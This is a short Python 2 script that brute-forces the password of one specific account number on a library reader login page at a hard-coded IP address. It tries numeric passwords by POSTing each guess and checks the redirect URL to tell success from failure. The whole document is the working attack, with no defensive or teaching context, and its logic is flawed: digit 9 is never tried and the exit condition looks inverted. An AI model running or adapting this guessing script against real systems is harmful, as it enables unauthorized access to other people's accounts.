import urllib2
import urllib
import sys

loginUrl = 'http://202.112.134.140:8080/reader/redr_verify.php'


#passwd = ''
#lenofpasswd = 0
def crack_gen(passwd,lenofpasswd):
    if lenofpasswd >= 4:
        result = judgePasswd('22200923001213',passwd) 
        print 'password:'+passwd+' '+str(result)
        if result == 0:
            return
        else:
            sys.exit()
    for i in range(0,9):
        crack_gen(passwd + str(i),lenofpasswd+1)

        
def judgePasswd(num, passwd):
    loginData = {'number':num,
             'passwd':passwd,
             'select':'cert_no',
             'returnUrl':''}
    postData = urllib.urlencode(loginData)
#cookieFile = urllib2.HTTPCookieProcessor()
#self.opener = urllib2.build_opener(cookieFile)
#self.opener = urllib2.build_opener()
    req = urllib2.Request(loginUrl, postData)
#result = self.opener.open(req)
    response = urllib2.urlopen(req)
#print str(response.code)
#print response.read()
#    except urllib2.HTTPError as e:
#        print e.code
#print response.info().dict

    if response.geturl() == 'http://202.112.134.140:8080/reader/login.php':
        #print 'yes'
        return 1
    else:
        #print 'no'
        return 0

if __name__ == '__main__':
    crack_gen('',0)
